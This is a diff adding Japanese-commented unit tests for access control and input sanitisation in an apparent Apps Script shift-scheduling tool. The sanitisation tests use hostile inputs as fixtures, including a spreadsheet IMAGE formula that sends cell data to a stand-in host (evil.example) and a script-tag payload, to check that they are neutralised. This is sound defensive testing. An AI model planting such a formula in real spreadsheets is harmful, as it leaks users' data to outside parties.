@@ -65,7 +65,8 @@ Object.assign(sandbox, vm.runInContext(
   + ' WORK_SYMS, WORK_SYM_PREFIX_MATCH, EDIT_REGION, STAMP_KIND, STAMP_REGION_RULES,'
   + ' SCHEMA, FORMAT_PROFILE, FORMAT_DEFAULT, DOCTOR_MASTER, PATTERN_MASTER,'
   + ' NOTE_MASTER,'
-  + ' ST_SKIP, ST_NONE, ST_WORK, ST_OFF, ST_FWORK, ST_FOFF })', sandbox));
+  + ' ST_SKIP, ST_NONE, ST_WORK, ST_OFF, ST_FWORK, ST_FOFF,'
+  + ' ROLE, ROLE_RANK, FORMULA_LEADS, FORMULA_LEAD_CTRL, CELL_MAX_LEN })', sandbox));
 
 // ---- テストランナー ----------------------------------------------------
 let passed = 0;
@@ -1709,6 +1710,228 @@ test('warekiYear_ は令和の年を2桁で返す', function () {
   assert.strictEqual(sandbox.warekiYear_(2019), '01');
   assert.strictEqual(sandbox.warekiYear_(2026), '08');
   assert.strictEqual(sandbox.warekiYear_(2028), '10', '2桁になっても切らない');
+});
+
+// ---- アクセス制御（Auth.gs） -----------------------------------------
+//
+// 原則: 画面から来た店舗 ID・社員 ID・権限は信用しない。
+// 誰であるかは Session が決め、何をしてよいかは社員マスタが決める。
+
+const MEMBERS = [
+  { id: 's1', name: 'A', email: 'Ippan@Example.com', role: 'staff', stores: ['st1'] },
+  { id: 's2', name: 'B', email: 'mgr@example.com', role: 'manager', stores: ['st1'] },
+  { id: 's3', name: 'C', email: 'mgr2@example.com', role: 'manager', stores: ['st1', 'st2'] },
+  { id: 's4', name: 'D', email: 'admin@example.com', role: 'admin', stores: [] },
+  { id: 's5', name: 'E', email: 'gone@example.com', role: 'manager', stores: ['st1'], retired: true },
+  { id: 's6', name: 'F', email: 'broken', role: 'admin', stores: ['st1'] },
+  { id: 's7', name: 'G', email: 'weird@example.com', role: '社長', stores: ['st1'] },
+];
+const ALL_STORES = ['st1', 'st2', 'st3'];
+
+// 拒否は console.error に出す作りなので、テスト中だけ黙らせる
+const quiet = function (fn) {
+  const real = sandbox.console.error;
+  sandbox.console.error = function () {};
+  try { return fn(); } finally { sandbox.console.error = real; }
+};
+
+test('メールアドレスは大文字小文字と空白を無視して照合する', function () {
+  const u = sandbox.resolveUser_(MEMBERS, '  IPPAN@example.COM ');
+  assert.strictEqual(u.id, 's1');
+  assert.strictEqual(u.email, 'ippan@example.com', '正規化した形で持つ');
+});
+
+test('未登録のアカウントは弾く', function () {
+  quiet(function () {
+    assert.throws(function () { sandbox.resolveUser_(MEMBERS, 'nobody@example.com'); },
+      /登録されていません/);
+  });
+});
+
+test('実行ユーザーを特定できないときは弾く（デプロイ設定の誤り）', function () {
+  quiet(function () {
+    assert.throws(function () { sandbox.resolveUser_(MEMBERS, ''); },
+      /アクセスしているユーザーとして実行/);
+  });
+});
+
+test('退職者は行が残っていても通さない', function () {
+  quiet(function () {
+    assert.throws(function () { sandbox.resolveUser_(MEMBERS, 'gone@example.com'); },
+      /登録されていません/);
+  });
+});
+
+test('メールの形が壊れている行は通さない', function () {
+  quiet(function () {
+    assert.throws(function () { sandbox.resolveUser_(MEMBERS, 'broken'); },
+      /登録されていません/);
+  });
+});
+
+test('知らない権限は最弱（staff）に倒す', function () {
+  const u = sandbox.resolveUser_(MEMBERS, 'weird@example.com');
+  assert.strictEqual(u.role, sandbox.ROLE.STAFF, '「社長」を admin と読まない');
+  assert.strictEqual(sandbox.canEdit_(u, 'st1'), false);
+});
+
+test('staff は自店を見られるが書けない', function () {
+  const u = sandbox.resolveUser_(MEMBERS, 'ippan@example.com');
+  assert.strictEqual(sandbox.canRead_(u, 'st1'), true);
+  assert.strictEqual(sandbox.canEdit_(u, 'st1'), false);
+  assert.strictEqual(sandbox.canEditMaster_(u), false);
+});
+
+test('manager は自店だけ書ける。他店は読むこともできない', function () {
+  const u = sandbox.resolveUser_(MEMBERS, 'mgr@example.com');
+  assert.strictEqual(sandbox.canEdit_(u, 'st1'), true);
+  assert.strictEqual(sandbox.canRead_(u, 'st2'), false, '他店は見えない');
+  assert.strictEqual(sandbox.canEdit_(u, 'st2'), false);
+  assert.strictEqual(sandbox.canEditMaster_(u), false, 'マスタは admin だけ');
+});
+
+test('複数店の manager は持ち店だけ書ける', function () {
+  const u = sandbox.resolveUser_(MEMBERS, 'mgr2@example.com');
+  assert.strictEqual(sandbox.canEdit_(u, 'st1'), true);
+  assert.strictEqual(sandbox.canEdit_(u, 'st2'), true);
+  assert.strictEqual(sandbox.canEdit_(u, 'st3'), false);
+});
+
+test('admin は所属が空でも全店を扱える', function () {
+  const u = sandbox.resolveUser_(MEMBERS, 'admin@example.com');
+  assert.strictEqual(sandbox.canEdit_(u, 'st3'), true);
+  assert.strictEqual(sandbox.canEditMaster_(u), true);
+  assert.deepStrictEqual(sandbox.visibleStores_(u, ALL_STORES), ALL_STORES);
+});
+
+test('店舗を指さない読み出しは許さない', function () {
+  const u = sandbox.resolveUser_(MEMBERS, 'mgr@example.com');
+  assert.strictEqual(sandbox.canRead_(u, ''), false);
+  assert.strictEqual(sandbox.canRead_(u, null), false);
+  assert.strictEqual(sandbox.canRead_(u, undefined), false);
+});
+
+test('画面から来た店舗IDは、実在かつ権限のあるものだけ通す', function () {
+  const u = sandbox.resolveUser_(MEMBERS, 'mgr@example.com');
+  assert.strictEqual(sandbox.requireStore_(u, 'st1', ALL_STORES), 'st1');
+  quiet(function () {
+    assert.throws(function () { sandbox.requireStore_(u, 'st2', ALL_STORES); },
+      /権限がありません/, '実在するが持っていない店');
+    assert.throws(function () { sandbox.requireStore_(u, 'st9', ALL_STORES); },
+      /権限がありません/, '実在しない店');
+    assert.throws(function () { sandbox.requireStore_(u, '', ALL_STORES); },
+      /権限がありません/, '空を既定値に読み替えない');
+  });
+});
+
+test('書き込みの門は、権限が無ければ必ず投げる', function () {
+  const staff = sandbox.resolveUser_(MEMBERS, 'ippan@example.com');
+  quiet(function () {
+    assert.throws(function () { sandbox.assertCanEdit_(staff, 'st1'); }, /編集する権限/);
+    assert.throws(function () { sandbox.assertCanEdit_(null, 'st1'); }, /編集する権限/);
+    assert.throws(function () { sandbox.assertCanRead_(null, 'st1'); }, /閲覧する権限/);
+  });
+  const mgr = sandbox.resolveUser_(MEMBERS, 'mgr@example.com');
+  assert.strictEqual(sandbox.assertCanEdit_(mgr, 'st1'), true);
+});
+
+// ---- 数式インジェクション（Sanitize.gs） -------------------------------
+//
+// シートに書く値はデータではなくコードになりうる。しかも開いた人の権限で動く。
+
+test('数式になる先頭文字は無効化する', function () {
+  const f = sandbox.cellSafe_;
+  assert.strictEqual(f('=IMPORTRANGE("id","A1")').charAt(0), "'");
+  assert.strictEqual(f('+1+1'), "'+1+1");
+  assert.strictEqual(f('-1'), "'-1");
+  assert.strictEqual(f('@SUM(A1)'), "'@SUM(A1)");
+});
+
+test('外へ送る数式も止まる（IMAGE を使う手口）', function () {
+  const v = '=IMAGE("https://evil.example/?d="&ENCODEURL(JOIN(",",A1:Z99)))';
+  const out = sandbox.cellSafe_(v);
+  assert.strictEqual(out.charAt(0), "'", '先頭が数式として解釈されない');
+  assert.strictEqual(out.slice(1), v, '中身は変えない');
+});
+
+test('ふつうの入力は変えない', function () {
+  const f = sandbox.cellSafe_;
+  assert.strictEqual(f('公休'), '公休');
+  assert.strictEqual(f('▲遅番'), '▲遅番');
+  assert.strictEqual(f(''), '');
+  assert.strictEqual(f(null), '');
+  assert.strictEqual(f(3), 3, '数値はそのまま');
+  assert.strictEqual(f(true), true);
+});
+
+test('制御文字は落とす（タブ始まりも数式になる）', function () {
+  const f = sandbox.cellSafe_;
+  assert.strictEqual(f('\t=1+1'), "'=1+1", 'タブを落としたあと数式判定に掛ける');
+  assert.strictEqual(f('公\u0000休'), '公休', 'NUL を落とす');
+  assert.strictEqual(f('a\rb'), 'ab');
+});
+
+test('長すぎる入力は切る', function () {
+  const long = 'あ'.repeat(sandbox.CELL_MAX_LEN + 100);
+  assert.strictEqual(sandbox.cellSafe_(long).length, sandbox.CELL_MAX_LEN);
+});
+
+test('二次元配列をまとめて通せる', function () {
+  const out = sandbox.cellSafeGrid_([['=A1', '公休'], [null, 3]]);
+  assert.deepStrictEqual(out, [["'=A1", '公休'], ['', 3]]);
+});
+
+test('残っている数式を読み出し側で見つける', function () {
+  quiet(function () {
+    const hits = sandbox.findFormulas_([['', ''], ['', '=IMPORTRANGE("x","A1")']], 'シフト');
+    assert.strictEqual(hits.length, 1);
+    assert.strictEqual(hits[0].row, 1);
+    assert.strictEqual(hits[0].col, 1);
+    assert.throws(function () {
+      sandbox.assertNoFormulas_([['=1+1']], 'シフト');
+    }, /取り込みを中止/);
+  });
+  assert.strictEqual(sandbox.assertNoFormulas_([['', ''], ['', '']], 'シフト'), true);
+});
+
+test('HTML に埋める文字列は必ず逃がす', function () {
+  assert.strictEqual(sandbox.escapeHtml_('<script>alert(1)</script>'),
+    '&lt;script&gt;alert(1)&lt;/script&gt;');
+  assert.strictEqual(sandbox.escapeHtml_(String.fromCharCode(34) + String.fromCharCode(39) + '&'),
+    '&quot;&#39;&amp;');
+});
+
+// ---- 画面から来た値の検証 ---------------------------------------------
+
+test('記号はマスタにあるものだけ通す', function () {
+  const ok = ['○', '▲', '公休'];
+  assert.strictEqual(sandbox.requireSymbol_('▲', ok), '▲');
+  assert.strictEqual(sandbox.requireSymbol_('', ok), '', '消す操作は通す');
+  quiet(function () {
+    assert.throws(function () { sandbox.requireSymbol_('=1+1', ok); }, /登録されていない/);
+    assert.throws(function () { sandbox.requireSymbol_('△', ok); }, /登録されていない/);
+  });
+});
+
+test('行キーは書ける行の一覧と突き合わせる', function () {
+  const keys = ['s001', 'doc1', 'note'];
+  assert.strictEqual(sandbox.requireRowKey_('doc1', keys), 'doc1');
+  quiet(function () {
+    assert.throws(function () { sandbox.requireRowKey_('agg', keys); }, /書き込めない行/);
+    assert.throws(function () { sandbox.requireRowKey_('', keys); }, /書き込めない行/);
+  });
+});
+
+test('年月日は範囲外を黙って丸めない', function () {
+  // vm の中で作った object は deepStrictEqual が通らない（別レルムの Object）
+  const ym = sandbox.requireYearMonth_(2026, 9);
+  assert.strictEqual(ym.year, 2026);
+  assert.strictEqual(ym.month, 9);
+  assert.throws(function () { sandbox.requireYearMonth_(2026, 13); }, /扱えない月/);
+  assert.throws(function () { sandbox.requireYearMonth_(1999, 1); }, /扱えない年/);
+  assert.strictEqual(sandbox.requireDay_(2026, 2, 28), 28);
+  assert.throws(function () { sandbox.requireDay_(2026, 2, 30); }, /2月に 30 日はありません/);
+  assert.throws(function () { sandbox.requireDay_(2026, 9, 0); }, /はありません/);
 });
 
 // ---- 結果 -------------------------------------------------------------
